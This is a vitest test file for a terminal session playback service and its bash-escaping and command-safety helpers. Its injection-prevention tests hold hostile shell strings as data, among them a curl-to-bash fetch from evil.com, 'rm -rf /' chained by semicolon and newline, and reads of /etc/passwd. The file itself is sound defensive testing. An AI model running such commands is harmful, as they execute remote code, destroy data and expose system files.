import { describe, it, expect, beforeEach, vi, afterEach } from 'vitest';
import { SessionPlaybackService, PlaybackFrame, SessionPlaybackData } from '../SessionPlaybackService.js';
import { getDb } from '../../db/connection.js';
import {
  escapeForBash,
  escapeForDoubleQuotes,
  analyzeCommandSafety,
  sanitizeCommand,
  wrapInShell,
  validateBashScript,
} from '../../lib/bashEscaping.js';

vi.mock('../../db/connection.js', () => ({
  getDb: vi.fn(),
}));

let service: SessionPlaybackService;
let mockDb: any;

beforeEach(() => {
  mockDb = vi.fn();
  (getDb as any).mockReturnValue(mockDb);
  service = new SessionPlaybackService();
});

afterEach(() => {
  vi.clearAllMocks();
});

describe('SessionPlaybackService', () => {
  describe('getPlaybackData', () => {
    it('should return null when session not found', async () => {
      mockDb.mockResolvedValueOnce([]);

      const result = await service.getPlaybackData('non-existent');
      expect(result).toBeNull();
    });

    it('should reconstruct session timeline with commands', async () => {
      const now = new Date();
      const sessionStart = new Date(now.getTime() - 60000);
      const session = {
        id: 'session-1',
        created_at: sessionStart,
        ended_at: now,
      };

      const commands = [
        {
          id: 'cmd-1',
          command: 'ls',
          output: 'file1.txt file2.txt',
          exit_code: 0,
          executed_at: new Date(sessionStart.getTime() + 1000),
        },
        {
          id: 'cmd-2',
          command: 'pwd',
          output: '/home/user',
          exit_code: 0,
          executed_at: new Date(sessionStart.getTime() + 5000),
        },
      ];

      const participants = [{ id: 'user-1' }, { id: 'user-2' }];

      mockDb
        .mockResolvedValueOnce([session])
        .mockResolvedValueOnce(commands)
        .mockResolvedValueOnce([{ count: 2 }]);

      const result = await service.getPlaybackData('session-1');

      expect(result).not.toBeNull();
      expect(result!.sessionId).toBe('session-1');
      expect(result!.commandCount).toBe(2);
      expect(result!.participantCount).toBe(2);
      expect(result!.frames.length).toBeGreaterThan(0);
    });

    it('should handle session without end time', async () => {
      const sessionStart = new Date();
      const session = {
        id: 'session-1',
        created_at: sessionStart,
        ended_at: null,
      };

      const commands: any[] = [];

      mockDb
        .mockResolvedValueOnce([session])
        .mockResolvedValueOnce(commands)
        .mockResolvedValueOnce([{ count: 0 }]);

      const result = await service.getPlaybackData('session-1');

      expect(result).not.toBeNull();
      expect(result!.endTime).toBeUndefined();
    });
  });

  describe('getCommand', () => {
    it('should return command when found', async () => {
      const command = {
        id: 'cmd-1',
        session_id: 'session-1',
        command: 'ls',
        output: 'file1.txt',
        exit_code: 0,
      };

      mockDb.mockResolvedValueOnce([command]);

      const result = await service.getCommand('session-1', 'cmd-1');

      expect(result).toEqual(command);
      expect(mockDb).toHaveBeenCalled();
    });

    it('should return null when command not found', async () => {
      mockDb.mockResolvedValueOnce([]);

      const result = await service.getCommand('session-1', 'non-existent');

      expect(result).toBeNull();
    });
  });

  describe('getCommandsInRange', () => {
    it('should return commands within time range', async () => {
      const startTime = new Date();
      const endTime = new Date(startTime.getTime() + 60000);

      const commands = [
        { id: 'cmd-1', command: 'ls', executed_at: new Date(startTime.getTime() + 5000) },
        { id: 'cmd-2', command: 'pwd', executed_at: new Date(startTime.getTime() + 10000) },
      ];

      mockDb.mockResolvedValueOnce(commands);

      const result = await service.getCommandsInRange('session-1', startTime, endTime);

      expect(result).toHaveLength(2);
      expect(mockDb).toHaveBeenCalled();
    });

    it('should return empty array when no commands in range', async () => {
      mockDb.mockResolvedValueOnce([]);

      const result = await service.getCommandsInRange('session-1', new Date(), new Date());

      expect(result).toEqual([]);
    });
  });

  describe('getSessionTimeline', () => {
    it('should return timeline statistics', async () => {
      const startTime = new Date();
      const session = {
        created_at: startTime,
        ended_at: new Date(startTime.getTime() + 120000),
      };

      const cmdStats = {
        count: 5,
        last_command_time: new Date(startTime.getTime() + 100000),
      };

      mockDb.mockResolvedValueOnce([session]).mockResolvedValueOnce([cmdStats]);

      const result = await service.getSessionTimeline('session-1');

      expect(result).not.toBeNull();
      expect(result!.commandCount).toBe(5);
      expect(result!.startTime).toEqual(startTime);
      expect(result!.avgCommandInterval).toBeGreaterThan(0);
    });

    it('should return null when session not found', async () => {
      mockDb.mockResolvedValueOnce([]);

      const result = await service.getSessionTimeline('non-existent');

      expect(result).toBeNull();
    });

    it('should handle session with no commands', async () => {
      const startTime = new Date();
      const session = {
        created_at: startTime,
        ended_at: new Date(startTime.getTime() + 60000),
      };

      mockDb.mockResolvedValueOnce([session]).mockResolvedValueOnce([{ count: 0, last_command_time: null }]);

      const result = await service.getSessionTimeline('session-1');

      expect(result).not.toBeNull();
      expect(result!.commandCount).toBe(0);
      expect(result!.avgCommandInterval).toBe(0);
    });
  });

  describe('exportAsScript', () => {
    it('should export as JSON format', async () => {
      const startTime = new Date();
      const session = {
        id: 'session-1',
        created_at: startTime,
        ended_at: new Date(startTime.getTime() + 10000),
      };

      const commands = [
        {
          id: 'cmd-1',
          command: 'ls',
          output: 'file.txt',
          exit_code: 0,
          executed_at: new Date(startTime.getTime() + 1000),
          user_id: 'user-1',
        },
      ];

      mockDb
        .mockResolvedValueOnce([session])
        .mockResolvedValueOnce(commands)
        .mockResolvedValueOnce([{ count: 1 }]);

      const result = await service.exportAsScript('session-1', 'json');

      expect(result).toContain('sessionId');
      expect(result).toContain('session-1');
      expect(() => JSON.parse(result)).not.toThrow();
    });

    it('should export as bash script format', async () => {
      const startTime = new Date();
      const session = {
        id: 'session-1',
        created_at: startTime,
        ended_at: new Date(startTime.getTime() + 10000),
      };

      const commands = [
        {
          id: 'cmd-1',
          command: 'echo hello',
          output: 'hello',
          exit_code: 0,
          executed_at: new Date(startTime.getTime() + 1000),
          user_id: 'user-1',
        },
      ];

      mockDb
        .mockResolvedValueOnce([session])
        .mockResolvedValueOnce(commands)
        .mockResolvedValueOnce([{ count: 1 }]);

      const result = await service.exportAsScript('session-1', 'bash');

      expect(result).toContain('#!/bin/bash');
      expect(result).toContain('# Session Recording Replay');
      expect(result).toContain('echo hello');
      expect(result).toContain('sleep');
    });

    it('should escape single quotes in bash script', async () => {
      const startTime = new Date();
      const session = {
        id: 'session-1',
        created_at: startTime,
        ended_at: new Date(startTime.getTime() + 10000),
      };

      const commands = [
        {
          id: 'cmd-1',
          command: "echo 'don't'",
          output: "don't",
          exit_code: 0,
          executed_at: new Date(startTime.getTime() + 1000),
          user_id: 'user-1',
        },
      ];

      mockDb
        .mockResolvedValueOnce([session])
        .mockResolvedValueOnce(commands)
        .mockResolvedValueOnce([{ count: 1 }]);

      const result = await service.exportAsScript('session-1', 'bash');

      expect(result).toContain("'\\''");
    });

    it('should throw error when session not found', async () => {
      mockDb.mockResolvedValueOnce([]);

      await expect(service.exportAsScript('non-existent', 'bash')).rejects.toThrow('Session not found');
    });

    it('should include timing information in bash script', async () => {
      const startTime = new Date();
      const session = {
        id: 'session-1',
        created_at: startTime,
        ended_at: new Date(startTime.getTime() + 10000),
      };

      const commands = [
        {
          id: 'cmd-1',
          command: 'ls',
          output: 'file.txt',
          exit_code: 0,
          executed_at: new Date(startTime.getTime() + 1000),
          user_id: 'user-1',
        },
        {
          id: 'cmd-2',
          command: 'pwd',
          output: '/home',
          exit_code: 0,
          executed_at: new Date(startTime.getTime() + 5000),
          user_id: 'user-1',
        },
      ];

      mockDb
        .mockResolvedValueOnce([session])
        .mockResolvedValueOnce(commands)
        .mockResolvedValueOnce([{ count: 2 }]);

      const result = await service.exportAsScript('session-1', 'bash');

      expect(result).toContain('sleep');
      expect(result).toContain('# Session ID: session-1');
      expect(result).toContain('# Duration:');
      expect(result).toContain('# Commands: 2');
    });
  });

  describe('buildPlaybackFrames', () => {
    it('should build frames with proper timing', () => {
      const startTime = new Date();
      const commands = [
        {
          id: 'cmd-1',
          command: 'ls',
          output: 'file.txt',
          exit_code: 0,
          executed_at: new Date(startTime.getTime() + 1000),
          user_id: 'user-1',
        } as any,
      ];

      const frames = (service as any).buildPlaybackFrames(commands, startTime);

      expect(frames).toHaveLength(2);
      expect(frames[0].type).toBe('command');
      expect(frames[0].command).toBe('ls');
      expect(frames[0].timestamp).toBe(1000);
      expect(frames[1].type).toBe('output');
      expect(frames[1].output).toBe('file.txt');
    });

    it('should handle commands without output', () => {
      const startTime = new Date();
      const commands = [
        {
          id: 'cmd-1',
          command: 'ls',
          output: null,
          exit_code: 0,
          executed_at: new Date(startTime.getTime() + 1000),
          user_id: 'user-1',
        } as any,
      ];

      const frames = (service as any).buildPlaybackFrames(commands, startTime);

      expect(frames).toHaveLength(1);
      expect(frames[0].type).toBe('command');
    });

    it('should sort frames by timestamp', () => {
      const startTime = new Date();
      const commands = [
        {
          id: 'cmd-1',
          command: 'cmd1',
          output: 'out1',
          exit_code: 0,
          executed_at: new Date(startTime.getTime() + 5000),
          user_id: 'user-1',
        } as any,
        {
          id: 'cmd-2',
          command: 'cmd2',
          output: 'out2',
          exit_code: 0,
          executed_at: new Date(startTime.getTime() + 1000),
          user_id: 'user-1',
        } as any,
      ];

      const frames = (service as any).buildPlaybackFrames(commands, startTime);

      expect(frames[0].timestamp).toBeLessThanOrEqual(frames[1].timestamp);
    });
  });

  describe('exportAsScript - comprehensive bash syntax tests', () => {
    it('should handle commands with pipes and redirection', async () => {
      const startTime = new Date();
      const session = {
        id: 'session-1',
        created_at: startTime,
        ended_at: new Date(startTime.getTime() + 10000),
      };

      const commands = [
        {
          id: 'cmd-1',
          command: 'grep error log.txt | wc -l',
          output: '42',
          exit_code: 0,
          executed_at: new Date(startTime.getTime() + 1000),
          user_id: 'user-1',
        },
      ];

      mockDb
        .mockResolvedValueOnce([session])
        .mockResolvedValueOnce(commands)
        .mockResolvedValueOnce([{ count: 1 }]);

      const result = await service.exportAsScript('session-1', 'bash');

      expect(result).toContain('grep error log.txt | wc -l');
      expect(result).toContain('#!/bin/bash');
    });

    it('should escape complex shell metacharacters', async () => {
      const startTime = new Date();
      const session = {
        id: 'session-1',
        created_at: startTime,
        ended_at: new Date(startTime.getTime() + 10000),
      };

      const commands = [
        {
          id: 'cmd-1',
          command: 'echo "test $USER" && echo done',
          output: 'test user',
          exit_code: 0,
          executed_at: new Date(startTime.getTime() + 1000),
          user_id: 'user-1',
        },
      ];

      mockDb
        .mockResolvedValueOnce([session])
        .mockResolvedValueOnce(commands)
        .mockResolvedValueOnce([{ count: 1 }]);

      const result = await service.exportAsScript('session-1', 'bash');

      expect(result).toContain('echo "test $USER" && echo done');
    });

    it('should properly escape nested quotes', async () => {
      const startTime = new Date();
      const session = {
        id: 'session-1',
        created_at: startTime,
        ended_at: new Date(startTime.getTime() + 5000),
      };

      const commands = [
        {
          id: 'cmd-1',
          command: "awk '{print $1}' file.txt",
          output: 'result',
          exit_code: 0,
          executed_at: new Date(startTime.getTime() + 1000),
          user_id: 'user-1',
        },
      ];

      mockDb
        .mockResolvedValueOnce([session])
        .mockResolvedValueOnce(commands)
        .mockResolvedValueOnce([{ count: 1 }]);

      const result = await service.exportAsScript('session-1', 'bash');

      // The escaping should handle the single quotes properly
      expect(result).toContain('awk');
      expect(result).toContain('print');
    });

    it('should generate executable bash script with correct shebang', async () => {
      const startTime = new Date();
      const session = {
        id: 'session-1',
        created_at: startTime,
        ended_at: new Date(startTime.getTime() + 5000),
      };

      const commands = [
        {
          id: 'cmd-1',
          command: 'ls',
          output: 'file.txt',
          exit_code: 0,
          executed_at: new Date(startTime.getTime() + 1000),
          user_id: 'user-1',
        },
      ];

      mockDb
        .mockResolvedValueOnce([session])
        .mockResolvedValueOnce(commands)
        .mockResolvedValueOnce([{ count: 1 }]);

      const result = await service.exportAsScript('session-1', 'bash');

      expect(result).toContain('#!/bin/bash');
      expect(result).toContain('set -e');
      expect(result).toContain('set -u');
    });

    it('should include timing delays between commands', async () => {
      const startTime = new Date();
      const session = {
        id: 'session-1',
        created_at: startTime,
        ended_at: new Date(startTime.getTime() + 15000),
      };

      const commands = [
        {
          id: 'cmd-1',
          command: 'ls',
          output: 'file1.txt',
          exit_code: 0,
          executed_at: new Date(startTime.getTime() + 2000),
          user_id: 'user-1',
        },
        {
          id: 'cmd-2',
          command: 'pwd',
          output: '/home/user',
          exit_code: 0,
          executed_at: new Date(startTime.getTime() + 7000),
          user_id: 'user-1',
        },
      ];

      mockDb
        .mockResolvedValueOnce([session])
        .mockResolvedValueOnce(commands)
        .mockResolvedValueOnce([{ count: 2 }]);

      const result = await service.exportAsScript('session-1', 'bash');

      expect(result).toContain('sleep');
      const sleepMatches = result.match(/sleep/g);
      expect(sleepMatches).toBeTruthy();
    });

    it('should handle commands with special characters correctly', async () => {
      const startTime = new Date();
      const session = {
        id: 'session-1',
        created_at: startTime,
        ended_at: new Date(startTime.getTime() + 5000),
      };

      const commands = [
        {
          id: 'cmd-1',
          command: "echo 'hello' > /tmp/file.txt",
          output: '',
          exit_code: 0,
          executed_at: new Date(startTime.getTime() + 1000),
          user_id: 'user-1',
        },
      ];

      mockDb
        .mockResolvedValueOnce([session])
        .mockResolvedValueOnce(commands)
        .mockResolvedValueOnce([{ count: 1 }]);

      const result = await service.exportAsScript('session-1', 'bash');

      expect(result).toContain('echo');
      expect(result).toContain('/tmp/file.txt');
    });

    it('should generate script with correct metadata comments', async () => {
      const startTime = new Date();
      const session = {
        id: 'session-1',
        created_at: startTime,
        ended_at: new Date(startTime.getTime() + 120000), // 120 seconds
      };

      const commands = [
        {
          id: 'cmd-1',
          command: 'ls',
          output: 'file.txt',
          exit_code: 0,
          executed_at: new Date(startTime.getTime() + 1000),
          user_id: 'user-1',
        },
        {
          id: 'cmd-2',
          command: 'pwd',
          output: '/home',
          exit_code: 0,
          executed_at: new Date(startTime.getTime() + 5000),
          user_id: 'user-1',
        },
      ];

      mockDb
        .mockResolvedValueOnce([session])
        .mockResolvedValueOnce(commands)
        .mockResolvedValueOnce([{ count: 2 }]);

      const result = await service.exportAsScript('session-1', 'bash');

      expect(result).toContain('# Session ID: session-1');
      expect(result).toContain('# Duration: 120s');
      expect(result).toContain('# Commands: 2');
    });

    it('should handle commands with exit codes in JSON export', async () => {
      const startTime = new Date();
      const session = {
        id: 'session-1',
        created_at: startTime,
        ended_at: new Date(startTime.getTime() + 5000),
      };

      const commands = [
        {
          id: 'cmd-1',
          command: 'false',
          output: 'error occurred',
          exit_code: 1,
          executed_at: new Date(startTime.getTime() + 1000),
          user_id: 'user-1',
        },
      ];

      mockDb
        .mockResolvedValueOnce([session])
        .mockResolvedValueOnce(commands)
        .mockResolvedValueOnce([{ count: 1 }]);

      const result = await service.exportAsScript('session-1', 'json');
      const parsed = JSON.parse(result);

      expect(parsed.frames).toBeDefined();
      expect(parsed.frames.some((f: any) => f.exitCode === 1)).toBe(true);
    });
  });

  describe('exportAsScript - JSON export validation', () => {
    it('should produce valid JSON with all required fields', async () => {
      const startTime = new Date();
      const session = {
        id: 'session-1',
        created_at: startTime,
        ended_at: new Date(startTime.getTime() + 10000),
      };

      const commands = [
        {
          id: 'cmd-1',
          command: 'ls',
          output: 'file.txt',
          exit_code: 0,
          executed_at: new Date(startTime.getTime() + 1000),
          user_id: 'user-1',
        },
      ];

      mockDb
        .mockResolvedValueOnce([session])
        .mockResolvedValueOnce(commands)
        .mockResolvedValueOnce([{ count: 1 }]);

      const result = await service.exportAsScript('session-1', 'json');
      const parsed = JSON.parse(result);

      expect(parsed.sessionId).toBe('session-1');
      expect(parsed.startTime).toBeDefined();
      expect(parsed.totalDuration).toBeGreaterThan(0);
      expect(parsed.commandCount).toBe(1);
      expect(parsed.participantCount).toBeGreaterThan(0);
      expect(Array.isArray(parsed.frames)).toBe(true);
    });

    it('should include all frame types in JSON export', async () => {
      const startTime = new Date();
      const session = {
        id: 'session-1',
        created_at: startTime,
        ended_at: new Date(startTime.getTime() + 10000),
      };

      const commands = [
        {
          id: 'cmd-1',
          command: 'echo test',
          output: 'test',
          exit_code: 0,
          executed_at: new Date(startTime.getTime() + 1000),
          user_id: 'user-1',
        },
      ];

      mockDb
        .mockResolvedValueOnce([session])
        .mockResolvedValueOnce(commands)
        .mockResolvedValueOnce([{ count: 1 }]);

      const result = await service.exportAsScript('session-1', 'json');
      const parsed = JSON.parse(result);

      const types = new Set(parsed.frames.map((f: any) => f.type));
      expect(types.has('command')).toBe(true);
      expect(types.has('output')).toBe(true);
    });
  });

  describe('exportAsScript - OWASP Bash Injection Prevention', () => {
    it('should safely escape command substitution $(whoami)', async () => {
      const startTime = new Date();
      const session = {
        id: 'session-1',
        created_at: startTime,
        ended_at: new Date(startTime.getTime() + 5000),
      };

      const commands = [
        {
          id: 'cmd-1',
          command: '$(whoami)',
          output: 'root',
          exit_code: 0,
          executed_at: new Date(startTime.getTime() + 1000),
          user_id: 'user-1',
        },
      ];

      mockDb
        .mockResolvedValueOnce([session])
        .mockResolvedValueOnce(commands)
        .mockResolvedValueOnce([{ count: 1 }]);

      const result = await service.exportAsScript('session-1', 'bash');

      // Should wrap in eval with safe escaping
      expect(result).toContain("eval '$(whoami)'");
      expect(result).not.toContain('$(whoami)\n$(whoami)');
    });

    it('should safely escape backtick command execution', async () => {
      const startTime = new Date();
      const session = {
        id: 'session-1',
        created_at: startTime,
        ended_at: new Date(startTime.getTime() + 5000),
      };

      const commands = [
        {
          id: 'cmd-1',
          command: '`whoami`',
          output: 'root',
          exit_code: 0,
          executed_at: new Date(startTime.getTime() + 1000),
          user_id: 'user-1',
        },
      ];

      mockDb
        .mockResolvedValueOnce([session])
        .mockResolvedValueOnce(commands)
        .mockResolvedValueOnce([{ count: 1 }]);

      const result = await service.exportAsScript('session-1', 'bash');

      // Backticks should be safely wrapped
      expect(result).toContain("eval '`whoami`'");
    });

    it('should safely escape curl remote execution payload', async () => {
      const startTime = new Date();
      const session = {
        id: 'session-1',
        created_at: startTime,
        ended_at: new Date(startTime.getTime() + 5000),
      };

      const commands = [
        {
          id: 'cmd-1',
          command: '$(curl http://evil.com/script.sh | bash)',
          output: '',
          exit_code: 1,
          executed_at: new Date(startTime.getTime() + 1000),
          user_id: 'user-1',
        },
      ];

      mockDb
        .mockResolvedValueOnce([session])
        .mockResolvedValueOnce(commands)
        .mockResolvedValueOnce([{ count: 1 }]);

      const result = await service.exportAsScript('session-1', 'bash');

      // Should escape the entire command safely
      expect(result).toContain('eval');
      expect(result).toContain("'$(curl");
      // Ensure command injection is prevented
      expect(result).not.toContain('curl http://evil.com/script.sh | bash\n$(');
    });

    it('should safely handle command injection via semicolon chaining', async () => {
      const startTime = new Date();
      const session = {
        id: 'session-1',
        created_at: startTime,
        ended_at: new Date(startTime.getTime() + 5000),
      };

      const commands = [
        {
          id: 'cmd-1',
          command: 'echo hello; rm -rf /',
          output: 'hello',
          exit_code: 0,
          executed_at: new Date(startTime.getTime() + 1000),
          user_id: 'user-1',
        },
      ];

      mockDb
        .mockResolvedValueOnce([session])
        .mockResolvedValueOnce(commands)
        .mockResolvedValueOnce([{ count: 1 }]);

      const result = await service.exportAsScript('session-1', 'bash');

      // Should escape the command as a single unit
      expect(result).toContain("eval 'echo hello; rm -rf /'");
    });

    it('should safely escape logical operator command chaining', async () => {
      const startTime = new Date();
      const session = {
        id: 'session-1',
        created_at: startTime,
        ended_at: new Date(startTime.getTime() + 5000),
      };

      const commands = [
        {
          id: 'cmd-1',
          command: 'test -f /etc/passwd && cat /etc/passwd',
          output: 'root:x:0:0:root:/root:/bin/bash',
          exit_code: 0,
          executed_at: new Date(startTime.getTime() + 1000),
          user_id: 'user-1',
        },
      ];

      mockDb
        .mockResolvedValueOnce([session])
        .mockResolvedValueOnce(commands)
        .mockResolvedValueOnce([{ count: 1 }]);

      const result = await service.exportAsScript('session-1', 'bash');

      // Entire command should be escaped
      expect(result).toContain("eval 'test -f /etc/passwd && cat /etc/passwd'");
    });

    it('should safely escape pipe operator command chaining', async () => {
      const startTime = new Date();
      const session = {
        id: 'session-1',
        created_at: startTime,
        ended_at: new Date(startTime.getTime() + 5000),
      };

      const commands = [
        {
          id: 'cmd-1',
          command: 'cat /etc/passwd | grep root',
          output: 'root:x:0:0:root:/root:/bin/bash',
          exit_code: 0,
          executed_at: new Date(startTime.getTime() + 1000),
          user_id: 'user-1',
        },
      ];

      mockDb
        .mockResolvedValueOnce([session])
        .mockResolvedValueOnce(commands)
        .mockResolvedValueOnce([{ count: 1 }]);

      const result = await service.exportAsScript('session-1', 'bash');

      // Pipe should be safely escaped
      expect(result).toContain("eval 'cat /etc/passwd | grep root'");
    });

    it('should safely handle newline injection attempts', async () => {
      const startTime = new Date();
      const session = {
        id: 'session-1',
        created_at: startTime,
        ended_at: new Date(startTime.getTime() + 5000),
      };

      const commands = [
        {
          id: 'cmd-1',
          command: 'echo test\nrm -rf /',
          output: 'test',
          exit_code: 0,
          executed_at: new Date(startTime.getTime() + 1000),
          user_id: 'user-1',
        },
      ];

      mockDb
        .mockResolvedValueOnce([session])
        .mockResolvedValueOnce(commands)
        .mockResolvedValueOnce([{ count: 1 }]);

      const result = await service.exportAsScript('session-1', 'bash');

      // Newlines in command should be escaped
      expect(result).toContain('echo');
      expect(result).not.toContain('rm -rf /\n');
    });

    it('should safely escape variable expansion injection', async () => {
      const startTime = new Date();
      const session = {
        id: 'session-1',
        created_at: startTime,
        ended_at: new Date(startTime.getTime() + 5000),
      };

      const commands = [
        {
          id: 'cmd-1',
          command: 'echo $SHELL',
          output: '/bin/bash',
          exit_code: 0,
          executed_at: new Date(startTime.getTime() + 1000),
          user_id: 'user-1',
        },
      ];

      mockDb
        .mockResolvedValueOnce([session])
        .mockResolvedValueOnce(commands)
        .mockResolvedValueOnce([{ count: 1 }]);

      const result = await service.exportAsScript('session-1', 'bash');

      // Variable expansion should be safely escaped
      expect(result).toContain("'echo $SHELL'");
    });

    it('should generate script with security warning header', async () => {
      const startTime = new Date();
      const session = {
        id: 'session-1',
        created_at: startTime,
        ended_at: new Date(startTime.getTime() + 5000),
      };

      const commands = [
        {
          id: 'cmd-1',
          command: 'ls',
          output: 'file.txt',
          exit_code: 0,
          executed_at: new Date(startTime.getTime() + 1000),
          user_id: 'user-1',
        },
      ];

      mockDb
        .mockResolvedValueOnce([session])
        .mockResolvedValueOnce(commands)
        .mockResolvedValueOnce([{ count: 1 }]);

      const result = await service.exportAsScript('session-1', 'bash');

      expect(result).toContain('#!/bin/bash');
      expect(result).toContain('set -e');
      expect(result).toContain('set -u');
      expect(result).toContain('WARNING: This script replays recorded commands');
    });
  });

  describe('escapeForBash - Unit Tests', () => {
    it('should escape single quotes with correct pattern', () => {
      const input = "echo 'hello'";
      const result = escapeForBash(input);
      expect(result).toBe("'echo '\\''hello'\\'''");
    });

    it('should escape multiple single quotes', () => {
      const input = "don't can't won't";
      const result = escapeForBash(input);
      expect(result).toContain("'\\''");
    });

    it('should escape command substitution patterns', () => {
      const input = '$(whoami)';
      const result = escapeForBash(input);
      expect(result).toBe("'$(whoami)'");
    });

    it('should escape backtick execution', () => {
      const input = '`whoami`';
      const result = escapeForBash(input);
      expect(result).toBe("'`whoami`'");
    });

    it('should escape variable expansion', () => {
      const input = 'echo $USER';
      const result = escapeForBash(input);
      expect(result).toBe("'echo $USER'");
    });

    it('should escape pipe operators', () => {
      const input = 'cat file.txt | grep error';
      const result = escapeForBash(input);
      expect(result).toBe("'cat file.txt | grep error'");
    });

    it('should escape command separator semicolon', () => {
      const input = 'echo hello; echo world';
      const result = escapeForBash(input);
      expect(result).toBe("'echo hello; echo world'");
    });

    it('should remove newline characters', () => {
      const input = 'echo hello\necho world';
      const result = escapeForBash(input);
      expect(result).not.toContain('\n');
      expect(result).toContain('echo hello');
      expect(result).toContain('echo world');
    });

    it('should handle empty string', () => {
      const result = escapeForBash('');
      expect(result).toBe("''");
    });

    it('should handle null-like string', () => {
      const result = escapeForBash('\0');
      expect(result).toContain("'");
    });

    it('should escape complex injection payload', () => {
      const input = '$(curl http://evil.com | bash)';
      const result = escapeForBash(input);
      expect(result).toBe("'$(curl http://evil.com | bash)'");
    });

    it('should escape glob expansion patterns', () => {
      const input = 'rm -rf *';
      const result = escapeForBash(input);
      expect(result).toBe("'rm -rf *'");
    });

    it('should escape with logical operators', () => {
      const input = 'test -f file && rm file';
      const result = escapeForBash(input);
      expect(result).toBe("'test -f file && rm file'");
    });

    it('should handle redirection operators', () => {
      const input = 'echo hello > /tmp/file.txt';
      const result = escapeForBash(input);
      expect(result).toBe("'echo hello > /tmp/file.txt'");
    });

    it('should handle command with multiple quotes', () => {
      const input = "awk '{print $1}' file.txt";
      const result = escapeForBash(input);
      expect(result).toContain("'\\''");
    });

    it('should escape background execution operator', () => {
      const input = 'sleep 100 &';
      const result = escapeForBash(input);
      expect(result).toBe("'sleep 100 &'");
    });

    it('should escape double quotes', () => {
      const input = 'echo "hello world"';
      const result = escapeForBash(input);
      expect(result).toBe("'echo \"hello world\"'");
    });
  });

  describe('analyzeCommandSafety - Unit Tests', () => {
    it('should detect command substitution with $()', () => {
      const analysis = analyzeCommandSafety('$(whoami)');
      expect(analysis.isSafe).toBe(false);
      expect(analysis.warnings.some((w) => w.includes('Command substitution'))).toBe(true);
      expect(analysis.risks.some((r) => r.type === 'Command Substitution')).toBe(true);
    });

    it('should detect backtick execution', () => {
      const analysis = analyzeCommandSafety('`whoami`');
      expect(analysis.isSafe).toBe(false);
      expect(analysis.warnings.some((w) => w.includes('Backtick'))).toBe(true);
    });

    it('should detect variable expansion', () => {
      const analysis = analyzeCommandSafety('echo $USER');
      expect(analysis.warnings.some((w) => w.includes('Variable expansion'))).toBe(true);
    });

    it('should detect semicolon command separator', () => {
      const analysis = analyzeCommandSafety('echo hello; rm -rf /');
      expect(analysis.warnings.some((w) => w.includes('semicolon'))).toBe(true);
    });

    it('should detect logical operators', () => {
      const analysis = analyzeCommandSafety('test -f file && cat file');
      expect(analysis.warnings.length).toBeGreaterThan(0);
    });

    it('should detect pipe operators', () => {
      const analysis = analyzeCommandSafety('cat file | grep error');
      expect(analysis.warnings.some((w) => w.includes('pipes'))).toBe(true);
    });

    it('should detect glob patterns', () => {
      const analysis = analyzeCommandSafety('rm *');
      expect(analysis.warnings.length).toBeGreaterThan(0);
    });

    it('should mark safe simple commands as safe', () => {
      const analysis = analyzeCommandSafety('echo hello');
      expect(analysis.isSafe).toBe(true);
    });

    it('should detect multiple dangerous patterns', () => {
      const analysis = analyzeCommandSafety('$(cat file) | grep error');
      expect(analysis.risks.length).toBeGreaterThan(0);
    });

    it('should include severity levels in risks', () => {
      const analysis = analyzeCommandSafety('$(whoami)');
      expect(analysis.risks.some((r) => r.severity === 'critical')).toBe(true);
    });
  });

  describe('escapeForDoubleQuotes - Unit Tests', () => {
    it('should escape dollar signs', () => {
      const result = escapeForDoubleQuotes('echo $USER');
      expect(result).toBe('"echo \\$USER"');
    });

    it('should escape backticks', () => {
      const result = escapeForDoubleQuotes('echo `whoami`');
      expect(result).toContain('\\`');
    });

    it('should escape double quotes', () => {
      const result = escapeForDoubleQuotes('echo "hello"');
      expect(result).toContain('\\"');
    });

    it('should escape backslashes', () => {
      const result = escapeForDoubleQuotes('echo \\path');
      expect(result).toContain('\\\\');
    });

    it('should handle newlines', () => {
      const result = escapeForDoubleQuotes('echo\ntest');
      // Newlines are converted to spaces for safety
      expect(result).toContain('echo');
      expect(result).toContain('test');
      expect(result).toContain('"');
    });
  });

  describe('validateBashScript - Unit Tests', () => {
    it('should reject scripts with eval', () => {
      const result = validateBashScript('eval $command');
      expect(result.valid).toBe(false);
      expect(result.errors.some((e) => e.includes('eval'))).toBe(true);
    });

    it('should reject scripts with source', () => {
      const result = validateBashScript('source /etc/profile');
      expect(result.valid).toBe(false);
    });

    it('should warn about unquoted variables', () => {
      const result = validateBashScript('echo $var');
      expect(result.warnings.length).toBeGreaterThan(0);
    });

    it('should warn about rm with glob', () => {
      const result = validateBashScript('rm *');
      expect(result.warnings.some((w) => w.includes('rm'))).toBe(true);
    });

    it('should accept simple safe scripts', () => {
      const result = validateBashScript('#!/bin/bash\necho hello\necho world');
      expect(result.valid).toBe(true);
    });
  });

  describe('sanitizeCommand - Unit Tests', () => {
    it('should remove command substitution', () => {
      const result = sanitizeCommand('$(whoami)');
      expect(result).not.toContain('$');
    });

    it('should remove backtick execution', () => {
      const result = sanitizeCommand('`whoami`');
      expect(result).not.toContain('`');
    });

    it('should preserve safe commands', () => {
      const result = sanitizeCommand('echo hello');
      expect(result).toContain('echo');
      expect(result).toContain('hello');
    });
  });

  describe('wrapInShell - Unit Tests', () => {
    it('should wrap command in sh -c', () => {
      const result = wrapInShell('echo hello');
      expect(result).toContain('sh -c');
      expect(result).toContain('echo hello');
    });

    it('should safely escape wrapped command', () => {
      const result = wrapInShell('$(whoami)');
      expect(result).toContain("sh -c '$(whoami)'");
    });
  });
});
